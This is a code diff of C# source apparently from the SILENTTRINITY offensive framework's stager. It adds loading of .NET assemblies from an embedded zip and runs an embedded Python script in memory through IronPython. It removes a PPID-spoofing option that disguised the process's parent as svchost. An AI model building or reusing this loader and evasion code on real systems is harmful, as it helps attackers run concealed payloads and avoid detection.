@@ -3,13 +3,12 @@ using IronPython.Hosting;
 using IronPython.Modules;
 //using IronPython.Runtime;
 using System.IO;
+using System.IO.Compression;
 using System.Linq;
 using System.Reflection;
 using Microsoft.Scripting.Hosting;
-using Microsoft.Scripting.Utils;
+//using Microsoft.Scripting.Utils;
 using System.Collections.Generic;
-//using System.Diagnostics;
-//using System.Windows.Forms;
 
 namespace SILENTTRINITY
 {
@@ -37,20 +36,27 @@ namespace SILENTTRINITY
             Assembly asm = GetType().Assembly;
             var resQuery =
                 from name in asm.GetManifestResourceNames()
-                where name.ToLowerInvariant().EndsWith(".zip")
+                where name.ToLowerInvariant().Equals("stdlib.zip")
                 select name;
-           string resName = resQuery.Single();
-           Console.WriteLine("Found Python embedded stdlib: {0}", resName);
-           var importer = new ResourceMetaPathImporter(asm, resName);
-           dynamic sys = engineInstance.GetSysModule();
-           sys.meta_path.append(importer);
-           sys.path.append(importer);
-           //List metaPath = sys.GetVariable("meta_path");
-           //metaPath.Add(importer);
-           //sys.SetVariable("meta_path", metaPath);
+            try
+            {
+                string resName = resQuery.Single();
+                Console.WriteLine("Found Python embedded stdlib: {0}", resName);
+                var importer = new ResourceMetaPathImporter(asm, resName);
+                dynamic sys = engineInstance.GetSysModule();
+                sys.meta_path.append(importer);
+                sys.path.append(importer);
+                //List metaPath = sys.GetVariable("meta_path");
+                //metaPath.Add(importer);
+                //sys.SetVariable("meta_path", metaPath);
+            }
+            catch
+            {
+                Console.WriteLine("Could not find Python embedded stdlib");
+            }
         }
 
-        private static IDictionary<string, object> GetRuntimeOptions()
+        private IDictionary<string, object> GetRuntimeOptions()
         {
             var options = new Dictionary<string, object>
             {
@@ -61,100 +67,61 @@ namespace SILENTTRINITY
 
         public static void DumpEmbeddedResources()
         {
+            Console.WriteLine("Available embedded resources:");
             string[] resourceNames = Assembly.GetExecutingAssembly().GetManifestResourceNames();
             foreach (string resourceName in resourceNames)
             {
-                Console.WriteLine(resourceName);
+                Console.WriteLine("\t {0}", resourceName);
             }
+            Console.WriteLine();
+        }
+
+        public static Byte[] GetAssemblyInZip(ZipArchive zip, string assemblyName)
+        {
+            Byte[] assemblyData = new Byte[0];
+
+            foreach (var entry in zip.Entries)
+            {
+                if (entry.Name == assemblyName + ".dll")
+                {
+                    Console.WriteLine("Found {0}.dll in embedded resource zip file\n", assemblyName);
+                    using (var dll = entry.Open())
+                    {
+                        assemblyData = new Byte[entry.Length];
+                        dll.Read(assemblyData, 0, assemblyData.Length);
+                        return assemblyData;
+                    }
+                }
+            }
+            return assemblyData;
         }
 
         public static void Main(string[] args)
         {
 
-            Console.WriteLine("Available embedded resources:");
             DumpEmbeddedResources();
-            Console.WriteLine("\n");
+            String resourceZipFile = "SILENTTRINITY.Resources.dlls.zip";
 
-            AppDomain.CurrentDomain.AssemblyResolve += (sender, resourceargs) => {
+            ZipArchive zip = new ZipArchive(Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceZipFile), ZipArchiveMode.Read);
 
+            AppDomain.CurrentDomain.AssemblyResolve += (sender, resourceargs) =>
+            {
                 String assemblyName = new AssemblyName(resourceargs.Name).Name;
                 Console.WriteLine("Trying to resolve {0}", assemblyName);
-                String resourceName = "SILENTTRINITY.Resources." + assemblyName + ".dll";
-                // Console.WriteLine("resourceName: {0}", resourceName);
 
-                using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
-                {
-
-                    Byte[] assemblyData = new Byte[stream.Length];
-
-                    stream.Read(assemblyData, 0, assemblyData.Length);
-                    
-                    return Assembly.Load(assemblyData);
-
-                }
-  
+                return Assembly.Load(GetAssemblyInZip(zip, assemblyName));
             };
 
-            // Get Assembly Path 
-            string BinaryPath = Assembly.GetExecutingAssembly().CodeBase;
-            //string lpApplicationName = BinaryPath.Replace("file:///", string.Empty).Replace("/", @"\");
-            string lpApplicationName = Assembly.GetEntryAssembly().Location;
-
-            if (args.Length == 1 && args[0].ToLower() == "-parent")
-            {
-                Console.WriteLine("\n [+] Please enter a valid Parent Process name.");
-                Console.WriteLine(" [+] For Example: {0} -parent svchost", lpApplicationName);
-                return;
-            }
-            else if (args.Length == 2)
-            {
-                if (args[0].ToLower() == "-parent" && args[1] != null)
-                {
-                    string PPIDName = args[1];
-                    int NewPPID = 0;
-
-                    // Find PID from our new Parent and start new Process with new Parent ID
-                    NewPPID = ProcessCreator.NewParentPID(PPIDName);
-                    if (NewPPID == 0)
-                    {
-                        Console.WriteLine("\n [!] No suitable Process ID Found...");
-                        return;
-                    }
-
-                    if (!ProcessCreator.CreateProcess(NewPPID, lpApplicationName, null))
-                    {
-                        Console.WriteLine("\n [!] Oops PPID Spoof failed...");
-                        return;
-                    }
-                }
-            }
-            else
-            {
-                CreateRuntime();
-            }
-
-            return;
+            CreateRuntime();
         }
 
         public static void CreateRuntime()
         {
+            Runtime runtime = new Runtime();
 
-                Runtime runtime = new Runtime();
-                var myScript = (string)null;
-
-                try
-                {
-
-                    myScript = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream("SILENTTRINITY.Resources.Main.py")).ReadToEnd();
-
-                }
-                catch
-                {
-                    Console.WriteLine("Error accessing embedded Main.py file");
-                }
-
-                ScriptEngine engine = runtime.CreateEngine();
-                engine.Execute(myScript);
+            string myScript = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream("SILENTTRINITY.Resources.Main.py")).ReadToEnd();
+            ScriptEngine engine = runtime.CreateEngine();
+            engine.Execute(myScript);
 
         }
     }
